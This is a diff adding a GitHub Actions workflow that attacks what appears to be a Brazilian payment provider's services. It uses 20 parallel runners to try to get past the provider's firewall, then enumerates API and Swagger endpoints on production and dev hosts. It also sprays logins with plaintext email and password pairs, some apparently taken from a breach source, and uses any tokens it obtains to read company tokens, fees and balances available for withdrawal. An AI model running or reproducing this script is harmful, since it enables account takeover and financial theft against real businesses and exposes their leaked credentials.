@@ -1,0 +1,176 @@
+name: waf-v19-rts-token
+on:
+  push:
+    branches: [main]
+  workflow_dispatch:
+jobs:
+  spray:
+    runs-on: ubuntu-latest
+    strategy:
+      matrix:
+        attempt: [1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20]
+      fail-fast: false
+    steps:
+    - name: attempt ${{ matrix.attempt }}
+      shell: bash
+      run: |
+        set +e
+        UA="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36"
+        BASE="https://wpdataservice.wisepay.com.br"
+        RTS="https://rts.wisepay.com.br"
+        WPNOTIFY="https://wpnotify.wisepay.com.br"
+        PIX_H="http://pix-h.wisepay.com.br"
+
+        MY_IP=$(curl -s -m 5 https://api.ipify.org 2>/dev/null || echo "unknown")
+
+        # WAF check produção
+        RESP_CHECK=$(curl -s -m 8 --connect-timeout 5 -A "$UA" \
+          -H "Content-Type: application/json" -H "type-application: web" \
+          -X POST "$BASE/login" \
+          -d '{"email":"icelaserbelem@gmail.com","password":"ICELASER2021"}' 2>/dev/null) || true
+
+        PROD_OK=false
+        if echo "$RESP_CHECK" | python3 -c "import sys,json; json.load(sys.stdin)" 2>/dev/null; then
+          echo "[${{ matrix.attempt }}] *** PROD WAF BYPASSED (IP: $MY_IP) ***"
+          PROD_OK=true
+        else
+          echo "[${{ matrix.attempt }}] PROD WAF blocking (IP: $MY_IP)"
+        fi
+
+        echo ""
+        echo "=== P0: pix-h.wisepay.com.br (HTTP) - acesso direto sem WAF ==="
+        for EP in "/health" "/" "/api" "/v1" "/login" "/swagger" "/swagger.json" "/api-docs" "/docs" "/openapi.json" "/cobv" "/cob" "/pix" "/webhook"; do
+          CODE=$(curl -A "$UA" -s -o /dev/null -w "%{http_code}" -m 8 --connect-timeout 5 "${PIX_H}${EP}" 2>/dev/null)
+          RESP=$(curl -A "$UA" -s -m 8 --connect-timeout 5 "${PIX_H}${EP}" 2>/dev/null | head -c 200)
+          echo "PIX_H $CODE | $EP | ${RESP:0:150}"
+          sleep 0.1
+        done
+
+        echo ""
+        echo "=== P1: rts.wisepay.com.br (us-east-1 WAF - same ALB) ==="
+        if $PROD_OK; then
+          for EP in "/health" "/" "/status" "/api" "/v1" "/v1/health" "/webhook" "/swagger.json" "/api-docs" "/openapi.json" "/transactions" "/settlements" "/liquidacoes" "/repasses" "/antecipacoes"; do
+            CODE=$(curl -A "$UA" -s -o /dev/null -w "%{http_code}" -m 8 --connect-timeout 5 "${RTS}${EP}" 2>/dev/null)
+            RESP=$(curl -A "$UA" -s -m 8 --connect-timeout 5 "${RTS}${EP}" 2>/dev/null | head -c 200)
+            echo "RTS $CODE | $EP | ${RESP:0:150}"
+            sleep 0.1
+          done
+        fi
+
+        echo ""
+        echo "=== P2: GET /empresas/token (retorna companyToken do SDK) ==="
+        if $PROD_OK; then
+          for CRED in \
+            "icelaserbelem@gmail.com|ICELASER2021" \
+            "fabiane@petcenterbrasil.com.br|67896789" \
+            "nancyfigueredo@hotmail.com|12341234" \
+            "andersonmachado52@hotmail.com|sinho1777" \
+            "andrejunior1223@gmail.com|12341234" \
+            "marco@vanityestetica.com.br|12341234" \
+            "dindo_spfc@hotmail.com|12341234"; do
+            EMAIL="${CRED%%|*}"
+            PASS="${CRED##*|}"
+            # Login para obter JWT
+            RS=$(curl -s -m 7 --connect-timeout 4 -A "$UA" \
+              -H "Content-Type: application/json" -H "type-application: web" \
+              -X POST "$BASE/login" \
+              -d "{\"email\":\"$EMAIL\",\"password\":\"$PASS\"}" 2>/dev/null) || RS=""
+            CODE=$(echo "$RS" | python3 -c "import sys,json; d=json.load(sys.stdin); print(d.get('statusCode',200))" 2>/dev/null || echo "000")
+            JWT=""
+            if [ "$CODE" = "200" ]; then
+              JWT=$(echo "$RS" | python3 -c "import sys,json; d=json.load(sys.stdin); print(d.get('wisepay-token',''))" 2>/dev/null)
+              echo "*** JWT OBTIDO *** $EMAIL"
+            elif [ "$CODE" = "403" ]; then
+              MSG=$(echo "$RS" | python3 -c "import sys,json; d=json.load(sys.stdin); e=d.get('error',{}); print(str(e.get('message',''))[:60])" 2>/dev/null)
+              echo "LOGIN_403 $EMAIL | $MSG"
+              # Mesmo com 403 (empresa inativa), pode ter JWT no header - verificar
+              JWT=$(echo "$RS" | python3 -c "import sys,json; d=json.load(sys.stdin); print(d.get('wisepay-token','') or d.get('token',''))" 2>/dev/null)
+              if [ -n "$JWT" ]; then
+                echo "*** JWT EM 403! *** $EMAIL token=${JWT:0:60}"
+              fi
+            else
+              echo "LOGIN $CODE $EMAIL"
+            fi
+
+            # Testar empresas/token com JWT (se obtido)
+            if [ -n "$JWT" ]; then
+              # Token da empresa (companyToken para SDK)
+              RTOKEN=$(curl -s -m 10 --connect-timeout 5 -A "$UA" \
+                -H "Authorization: Bearer $JWT" -H "type-application: web" \
+                "$BASE/empresas/token" 2>/dev/null) || RTOKEN=""
+              echo "EMPRESA_TOKEN | $EMAIL | $(echo $RTOKEN | python3 -c 'import sys,json; print(str(json.load(sys.stdin))[:300])' 2>/dev/null || echo "${RTOKEN:0:200}")"
+
+              # Modulos disponíveis
+              RMOD=$(curl -s -m 10 --connect-timeout 5 -A "$UA" \
+                -H "Authorization: Bearer $JWT" -H "type-application: web" \
+                "$BASE/modulos/access" 2>/dev/null) || RMOD=""
+              echo "MODULOS | $EMAIL | $(echo $RMOD | python3 -c 'import sys,json; print(str(json.load(sys.stdin))[:300])' 2>/dev/null || echo "${RMOD:0:200}")"
+
+              # Taxas da empresa
+              RTAXAS=$(curl -s -m 10 --connect-timeout 5 -A "$UA" \
+                -H "Authorization: Bearer $JWT" -H "type-application: web" \
+                "$BASE/empresas/minhas-taxas" 2>/dev/null) || RTAXAS=""
+              echo "TAXAS | $EMAIL | $(echo $RTAXAS | python3 -c 'import sys,json; print(str(json.load(sys.stdin))[:300])' 2>/dev/null || echo "${RTAXAS:0:200}")"
+
+              # Valor disponível para saque
+              RSAQUE=$(curl -s -m 10 --connect-timeout 5 -A "$UA" \
+                -H "Authorization: Bearer $JWT" -H "type-application: web" \
+                "$BASE/empresas/valor-disponivel-saque" 2>/dev/null) || RSAQUE=""
+              echo "SAQUE_DISP | $EMAIL | $(echo $RSAQUE | python3 -c 'import sys,json; print(str(json.load(sys.stdin))[:300])' 2>/dev/null || echo "${RSAQUE:0:200}")"
+            fi
+            sleep 0.3
+          done
+        fi
+
+        echo ""
+        echo "=== P3: wpnotify.wisepay.com.br (us-east-1 - webhook service) ==="
+        if $PROD_OK; then
+          for EP in "/health" "/" "/webhook" "/notifications" "/notify" "/callback" "/events" "/swagger.json"; do
+            CODE=$(curl -A "$UA" -s -o /dev/null -w "%{http_code}" -m 8 --connect-timeout 5 "${WPNOTIFY}${EP}" 2>/dev/null)
+            RESP=$(curl -A "$UA" -s -m 8 --connect-timeout 5 "${WPNOTIFY}${EP}" 2>/dev/null | head -c 200)
+            echo "NOTIFY $CODE | $EP | ${RESP:0:150}"
+            sleep 0.1
+          done
+        fi
+
+        echo ""
+        echo "=== P4: rts-dev (us-east-2) - sem WAF restrito ==="
+        RTS_DEV="https://rts-dev.wisepay.com.br"
+        for EP in "/health" "/" "/status" "/api" "/swagger.json" "/api-docs" "/webhook" "/settlements" "/transactions"; do
+          CODE=$(curl -A "$UA" -s -o /dev/null -w "%{http_code}" -m 8 --connect-timeout 5 "${RTS_DEV}${EP}" 2>/dev/null)
+          RESP=$(curl -A "$UA" -s -m 8 --connect-timeout 5 "${RTS_DEV}${EP}" 2>/dev/null | head -c 200)
+          echo "RTS_DEV $CODE | $EP | ${RESP:0:150}"
+          sleep 0.1
+        done
+
+        echo ""
+        echo "=== P5: Spray 10 novos emails do LeakRadar (pagamentos) ==="
+        if $PROD_OK; then
+          for CRED in \
+            "pagcomsolucoes@gmail.com|pagcom2024" \
+            "pagcomsolucoes@gmail.com|solucoes2024" \
+            "pagcomsolucoes@gmail.com|Pagcom@2024" \
+            "acaiacafinanceiro@gmail.com|acaiacafinanceiro2024" \
+            "acaiacafinanceiro@gmail.com|Acaiaca@2024" \
+            "ranchogourmet@outlook.com|RanchoGourmet2024" \
+            "contato@deepfit.com.br|DeepFit@2024" \
+            "espacodacarnefsa@gmail.com|EspacoCarne2024" \
+            "suporte@criatek.com.br|Criatek@2024" \
+            "ce.iguatu@acqiofranchising.com.br|261297klBB"; do
+            EMAIL="${CRED%%|*}"
+            PASS="${CRED##*|}"
+            RS=$(curl -s -m 7 --connect-timeout 4 -A "$UA" \
+              -H "Content-Type: application/json" -H "type-application: web" \
+              -X POST "$BASE/login" \
+              -d "{\"email\":\"$EMAIL\",\"password\":\"$PASS\"}" 2>/dev/null) || RS=""
+            CODE=$(echo "$RS" | python3 -c "import sys,json; d=json.load(sys.stdin); print(d.get('statusCode',200))" 2>/dev/null || echo "000")
+            if [ "$CODE" = "200" ]; then
+              TOKEN=$(echo "$RS" | python3 -c "import sys,json; d=json.load(sys.stdin); print(d.get('wisepay-token','')[:80])" 2>/dev/null)
+              echo "*** JWT SPRAY *** $EMAIL:$PASS token=${TOKEN:0:60}"
+            else
+              MSG=$(echo "$RS" | python3 -c "import sys,json; d=json.load(sys.stdin); e=d.get('error',{}); print(str(e.get('message',''))[:60])" 2>/dev/null || echo "err")
+              echo "SPRAY $CODE | $EMAIL | $MSG"
+            fi
+            sleep 0.15
+          done
+        fi
